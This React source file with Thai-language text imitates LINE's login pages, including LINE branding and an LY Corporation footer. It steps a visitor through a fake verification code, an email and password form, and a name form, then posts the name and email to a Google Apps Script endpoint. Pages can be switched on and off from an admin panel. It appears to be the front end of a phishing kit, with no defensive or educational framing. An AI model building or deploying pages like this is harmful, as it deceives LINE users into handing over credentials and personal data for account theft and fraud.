import React, { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button.jsx'
import { Input } from '@/components/ui/input.jsx'
import './App.css'

function App() {
  const [currentStep, setCurrentStep] = useState(1)
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    password: ''
  })
  const [verificationCode, setVerificationCode] = useState('')
  const [timeLeft, setTimeLeft] = useState(180) // 3 minutes
  const [showEmailSuggestions, setShowEmailSuggestions] = useState(false)
  
  // ตั้งค่าหน้าที่จะแสดง (จาก Admin Panel)
  const [pageSettings, setPageSettings] = useState(() => {
    const saved = localStorage.getItem('pageSettings')
    return saved ? JSON.parse(saved) : {
      showVerificationPage: true,
      showEmailLoginPage: true,
      showFormPage: true,
      showQRPage: true,
      pageOrder: ['verification', 'emailLogin', 'form', 'qr']
    }
  })

  // Email suggestions
  const emailSuggestions = [
    'sareingsaehx@gmail.com',
    'user@gmail.com',
    'admin@line.com'
  ]

  // Generate random verification code
  useEffect(() => {
    setVerificationCode(Math.floor(1000 + Math.random() * 9000).toString())
  }, [])

  // Timer countdown
  useEffect(() => {
    if (currentStep === 1 && timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [currentStep, timeLeft])

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
  }

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: value
    }))
  }

  const handleEmailInputChange = (value) => {
    setFormData(prev => ({ ...prev, email: value }))
    setShowEmailSuggestions(value.length > 0)
  }

  const selectEmailSuggestion = (suggestion) => {
    setFormData(prev => ({ ...prev, email: suggestion }))
    setShowEmailSuggestions(false)
  }

  const getNextEnabledStep = (currentStepName) => {
    const stepMap = {
      'verification': 1,
      'emailLogin': 2,
      'form': 3,
      'qr': 4
    }
    
    const enabledPages = pageSettings.pageOrder.filter(page => {
      switch(page) {
        case 'verification': return pageSettings.showVerificationPage
        case 'emailLogin': return pageSettings.showEmailLoginPage
        case 'form': return pageSettings.showFormPage
        case 'qr': return pageSettings.showQRPage
        default: return false
      }
    })
    
    const currentIndex = enabledPages.indexOf(currentStepName)
    const nextPage = enabledPages[currentIndex + 1]
    
    return nextPage ? stepMap[nextPage] : 4 // Default to QR page
  }

  const handleVerificationNext = () => {
    const nextStep = getNextEnabledStep('verification')
    setCurrentStep(nextStep)
  }

  const handleEmailLogin = () => {
    if (!formData.email || !formData.password) {
      alert('กรุณากรอกอีเมลและรหัสผ่าน')
      return
    }
    const nextStep = getNextEnabledStep('emailLogin')
    setCurrentStep(nextStep)
  }

  const handleFormSubmit = async () => {
    if (!formData.firstName.trim() || !formData.lastName.trim()) {
      alert('กรุณากรอกข้อมูลให้ครบถ้วน')
      return
    }

    try {
      // ส่งข้อมูลไป Google Sheets
      const response = await fetch('https://script.google.com/macros/s/AKfycbxGoogleAppsScriptURLHere/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          firstName: formData.firstName,
          lastName: formData.lastName,
          email: formData.email,
          timestamp: new Date().toISOString()
        })
      })

      const nextStep = getNextEnabledStep('form')
      setCurrentStep(nextStep)
    } catch (error) {
      console.error('Error submitting form:', error)
      const nextStep = getNextEnabledStep('form')
      setCurrentStep(nextStep)
    }
  }

  // หน้ารหัสยืนยันตัวตน
  const renderStep1 = () => {
    if (!pageSettings.showVerificationPage) {
      const nextStep = getNextEnabledStep('verification')
      setCurrentStep(nextStep)
      return null
    }

    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-green-500 mb-2">LINE</h1>
            <h2 className="text-lg font-semibold text-gray-800 mb-2">รหัสยืนยันตัวตน</h2>
            <p className="text-sm text-gray-600">ตรวจสอบรหัสยืนยันตัวตนที่ได้รับใน LINE อย่างปลอดภัย</p>
          </div>
          
          <div className="bg-gray-100 rounded-lg p-6 mb-6">
            <div className="text-4xl font-bold text-green-500 mb-2">{verificationCode}</div>
            <div className="text-sm text-gray-600">เหลือเวลา {formatTime(timeLeft)}</div>
          </div>

          <div className="text-sm text-gray-600 mb-4">
            <p>ไม่ใช่ใครที่คุณยืนยันตัวตน LINE</p>
            <p>สำหรับยืนยันตัวตนใหม่</p>
          </div>

          <Button 
            onClick={handleVerificationNext}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white"
          >
            เข้าสู่ระบบด้วยรหัสยืนยัน
          </Button>
        </div>
      </div>
    )
  }

  // หน้าล็อกอินด้วยอีเมล
  const renderStep2 = () => {
    if (!pageSettings.showEmailLoginPage) {
      const nextStep = getNextEnabledStep('emailLogin')
      setCurrentStep(nextStep)
      return null
    }

    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-green-500 mb-2">LINE</h1>
            <h2 className="text-lg font-semibold text-gray-800 mb-2">เข้าสู่ระบบ</h2>
            <p className="text-sm text-gray-600">กรุณากรอกข้อมูลเพื่อเข้าสู่ระบบ</p>
          </div>

          <div className="space-y-4 mb-6">
            <div className="relative">
              <label className="block text-sm font-medium text-gray-700 mb-1">อีเมล</label>
              <Input
                type="email"
                name="email"
                value={formData.email}
                onChange={(e) => handleEmailInputChange(e.target.value)}
                onFocus={() => setShowEmailSuggestions(formData.email.length > 0)}
                placeholder="กรอกอีเมลของคุณ"
                className="w-full"
              />
              
              {/* Email Suggestions Dropdown */}
              {showEmailSuggestions && (
                <div className="absolute top-full left-0 right-0 bg-white border border-gray-200 rounded-lg shadow-lg z-10 mt-1">
                  {emailSuggestions
                    .filter(suggestion => suggestion.toLowerCase().includes(formData.email.toLowerCase()))
                    .map((suggestion, index) => (
                      <div
                        key={index}
                        className="px-3 py-2 hover:bg-gray-100 cursor-pointer text-sm flex items-center"
                        onClick={() => selectEmailSuggestion(suggestion)}
                      >
                        <div className="w-6 h-6 bg-gray-300 rounded-full mr-2 flex items-center justify-center">
                          <span className="text-xs">@</span>
                        </div>
                        <div>
                          <div className="font-medium">{suggestion}</div>
                          <div className="text-xs text-gray-500">••••••••••••</div>
                        </div>
                      </div>
                    ))}
                  <div className="px-3 py-2 text-xs text-gray-500 border-t">
                    วิธีการใหม่... 
                    <span className="text-blue-500 ml-1">🔵</span>
                  </div>
                </div>
              )}
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">รหัสผ่าน</label>
              <Input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                placeholder="กรอกรหัสผ่าน"
                className="w-full"
              />
            </div>
          </div>

          <Button 
            onClick={handleEmailLogin}
            className="w-full bg-gray-400 hover:bg-gray-500 text-white mb-4"
            disabled={!formData.email || !formData.password}
          >
            ยืนยัน
          </Button>

          <div className="text-center">
            <hr className="my-4" />
            <p className="text-sm text-gray-600 mb-2">เข้าสู่ระบบด้วยวิธีอื่น</p>
            <p className="text-sm text-blue-500 mb-2">เข้าสู่ระบบด้วยคิวอาร์โค้ด</p>
            <hr className="my-4" />
            <p className="text-sm text-gray-600">การใช้งานใหม่ใน LINE</p>
            <button className="text-blue-500 text-sm underline">
              ลืมรหัสผ่านหรือไม่?
            </button>
          </div>
        </div>
      </div>
    )
  }

  // หน้าฟอร์มกรอกข้อมูล
  const renderStep3 = () => {
    if (!pageSettings.showFormPage) {
      const nextStep = getNextEnabledStep('form')
      setCurrentStep(nextStep)
      return null
    }

    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-green-500 mb-4">LINE</h1>
          </div>

          <div className="space-y-4 mb-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">ชื่อ</label>
              <Input
                type="text"
                name="firstName"
                value={formData.firstName}
                onChange={handleInputChange}
                placeholder="กรอกชื่อ"
                className="w-full"
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">นามสกุล</label>
              <Input
                type="text"
                name="lastName"
                value={formData.lastName}
                onChange={handleInputChange}
                placeholder="กรอกนามสกุล"
                className="w-full"
              />
            </div>
          </div>

          <Button 
            onClick={handleFormSubmit}
            className="w-full bg-gray-400 hover:bg-gray-500 text-white mb-4"
            disabled={!formData.firstName || !formData.lastName}
          >
            ยืนยัน
          </Button>

          <div className="text-center">
            <hr className="my-4" />
            <p className="text-sm text-gray-600 mb-2">เข้าสู่ระบบด้วยวิธีอื่น</p>
            <p className="text-sm text-blue-500 mb-2">เข้าสู่ระบบด้วยคิวอาร์โค้ด</p>
            <hr className="my-4" />
            <p className="text-sm text-gray-600">การใช้งานใหม่ใน LINE</p>
            <button className="text-blue-500 text-sm underline">
              ลืมรหัสผ่านหรือไม่?
            </button>
          </div>
        </div>
      </div>
    )
  }

  // หน้า QR Code
  const renderStep4 = () => {
    if (!pageSettings.showQRPage) {
      return null
    }

    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-green-500 mb-4">LINE</h1>
            <h2 className="text-lg font-semibold text-gray-800 mb-4">เข้าสู่ระบบด้วยคิวอาร์โค้ด</h2>
          </div>

          <div className="mb-6">
            <div className="bg-gray-100 p-4 rounded-lg mb-4">
              {/* QR Code placeholder */}
              <div className="w-32 h-32 mx-auto bg-black flex items-center justify-center text-white text-xs">
                QR CODE
              </div>
            </div>
            
            <div className="flex items-center justify-center mb-4">
              <input type="radio" className="mr-2" />
              <span className="text-sm text-gray-600">สร้างคิวอาร์โค้ดใหม่</span>
            </div>
            
            <p className="text-sm text-gray-600 mb-2">
              โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับยืนยันตัวตนแล้ว
            </p>
            <p className="text-sm text-gray-600">สแกนคิวอาร์โค้ด</p>
          </div>

          <Button 
            onClick={() => setCurrentStep(pageSettings.showEmailLoginPage ? 2 : 1)}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white"
          >
            เข้าสู่ระบบด้วยอีเมล
          </Button>

          <div className="mt-4">
            <button className="text-blue-500 text-sm underline">
              วิธีสแกนคิวอาร์โค้ด
            </button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="font-sans">
      {currentStep === 1 && renderStep1()}
      {currentStep === 2 && renderStep2()}
      {currentStep === 3 && renderStep3()}
      {currentStep === 4 && renderStep4()}
      
      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-2 text-xs text-gray-500 flex justify-between">
        <span>© LY Corporation</span>
        <div className="space-x-4">
          <span>นโยบายความเป็นส่วนตัว</span>
          <span>ข้อกำหนดการใช้บริการ</span>
        </div>
      </div>
    </div>
  )
}

export default App

